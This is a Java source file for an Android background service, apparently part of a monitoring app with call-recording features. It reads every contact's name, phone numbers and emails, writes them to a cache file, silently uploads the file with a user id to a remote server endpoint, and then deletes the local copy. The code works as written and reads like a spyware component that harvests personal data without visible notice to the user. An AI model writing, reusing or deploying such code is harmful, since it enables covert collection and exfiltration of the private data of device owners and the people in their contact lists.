package rapidora.co.myapplication.services;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import rapidora.co.myapplication.CallRecording.FileHelper;
import rapidora.co.myapplication.common.ConnectionDetector;
import rapidora.co.myapplication.common.Constants;
import rapidora.co.myapplication.common.CustomLogger;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;


public class ContactService extends IntentService {
    String contact;
    ConnectionDetector cd;
    SessionManagment sd;
    int count;
    PowerManager.WakeLock screenLock;

    public ContactService() {
        super(ContactService.class.getName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        cd = new ConnectionDetector(getApplicationContext());
        sd = new SessionManagment(getApplicationContext());
       /* screenLock = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "TAG");
        screenLock.acquire();*/

        CustomLogger.getInsatance(getApplicationContext()).putLog("ContcatService:-" + "running");
        if (!cd.isConnectingToInternet()) {
            //  Utils.scheduleAlarm2(getApplicationContext(),MyService.this);
            //Toast.makeText(getActivity(), "Internet Connection not available", Toast.LENGTH_LONG).show();
        } else {
            count = sd.getCount();
            fetchContacts();
            count++;
            sd.setCount(count);
        }
    }

    @Override
    public void onDestroy() {
       // if (screenLock.isHeld()) screenLock.release();
        super.onDestroy();
    }

    public void fetchContacts() {
        try {
            String phoneNumber = null;
            String email = null;
            Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
            String _ID = ContactsContract.Contacts._ID;
            String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
            String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
            Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
            String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

            Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
            String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
            String DATA = ContactsContract.CommonDataKinds.Email.DATA;

            StringBuffer output = new StringBuffer();
            if (ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                return;
            }
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null, null);
            int count = 0;
            // Loop for every contact in the phone
            if (cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    count++;
                    String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                    String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
                    int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER)));
                    if (hasPhoneNumber > 0) {
                        output.append("\n First Name:" + name);
                        // Query and loop for every phone number of the contact
                        Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[]{contact_id}, null);
                        while (phoneCursor.moveToNext()) {
                            phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                            output.append("\n Phone number:" + phoneNumber);
                        }
                        phoneCursor.close();
                        // Query and loop for every email of the contact
                        Cursor emailCursor = contentResolver.query(EmailCONTENT_URI, null, EmailCONTACT_ID + " = ?", new String[]{contact_id}, null);
                        while (emailCursor.moveToNext()) {
                            email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
                            output.append("\nEmail:" + email);
                        }

                        emailCursor.close();
                    }
                    output.append("\n");
                    if (count >= cursor.getCount())
                        generateNoteOnSD(getApplicationContext(), "contact.txt", String.valueOf(output));
                }
            }
        } catch (Exception e) {

        }
    }

    public void generateNoteOnSD(Context context, String sFileName, String sBody) {
        try {
            // File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            File root = new File(FileHelper.getCacheDir(context), "Notes");
            File gpxfile1 = new File(root, sFileName);
            if (gpxfile1.exists()) {
                gpxfile1.delete();
            }
            if (!root.exists()) {
                root.mkdirs();
            }
            File gpxfile = new File(root, sFileName);
            contact = gpxfile.toString();
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(sBody);
            writer.flush();
            writer.close();
            //   Toast.makeText(context, "Saved Contact", Toast.LENGTH_SHORT).show();
            if (!cd.isConnectingToInternet()) {
                stopSelf();
            } else {
                new SendPostRequest().execute();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

/*

    public class MyTask2 extends AsyncTask<Void, Void, Void> {
        Context context;
        File contactfile;
        String filename;
        String result = "";

        @Override
        protected Void doInBackground(Void... params) {


            try {
                contactfile = new File(contact);
                FileBody fbcontact = new FileBody(contactfile);
                HttpClient client = new DefaultHttpClient();
                HttpPost post = new HttpPost(Constants.UPDATE_CONTACT);
                MultipartEntityBuilder entityBuilder = MultipartEntityBuilder.create();
                entityBuilder.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);
                entityBuilder.addTextBody("gmail", sd.getEmail()+count);
                if (contactfile != null) {
                    entityBuilder.addPart("contact", fbcontact);
                }
                HttpEntity entity = entityBuilder.build();
                post.setEntity(entity);
                HttpResponse response = client.execute(post);
                HttpEntity httpEntity = response.getEntity();
                result = EntityUtils.toString(httpEntity);
                Utils.cancelAlarmContact(getApplicationContext());
                //session.setKeyIsVerify(false);
                Log.v("result", result);
                Log.e("", "result: " + result);

                CustomLogger.getInsatance(getApplicationContext()).putLog("ContcatService:-"+"response"+result);



                //  Toast.makeText(context, "" + result, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                CustomLogger.getInsatance(getApplicationContext()).putLog("ContcatService:-"+"Error"+e.toString());

                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {


        }
    }
*/


    public class SendPostRequest extends AsyncTask<String, Void, String> {

        protected void onPreExecute() {

        }

        protected String doInBackground(String... arg0) {
            try {
                CustomLogger.getInsatance(getApplicationContext()).putLog("ContactService:-" + "Execute");

                File calllogfile = new File(contact);
                MultipartEntity reqEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
                reqEntity.addPart("contact", new FileBody(calllogfile));
                reqEntity.addPart("id", new StringBody(sd.getUserId()));
                String response = Utils.multipost(Constants.UPDATE_CONTACT, reqEntity);
                if (response != null) {
                    Utils.cancelAlarmContact(getApplicationContext());
                    FileHelper.deletContact(getApplicationContext(), contact);
                }
                Log.e("response contact", response);
                CustomLogger.getInsatance(getApplicationContext()).putLog("ContcatService:-" + "response" + response);


                return response;
            } catch (Exception e) {
                CustomLogger.getInsatance(getApplicationContext()).putLog("ContcatService:-" + "Error" + e.toString());
                return new String("Exception: " + e.getMessage());
            }
        }

        @Override
        protected void onPostExecute(String result) {
            try {
                if (result != null)
                    stopSelf();
            } catch (Exception ex) {
            }

        }
    }
}
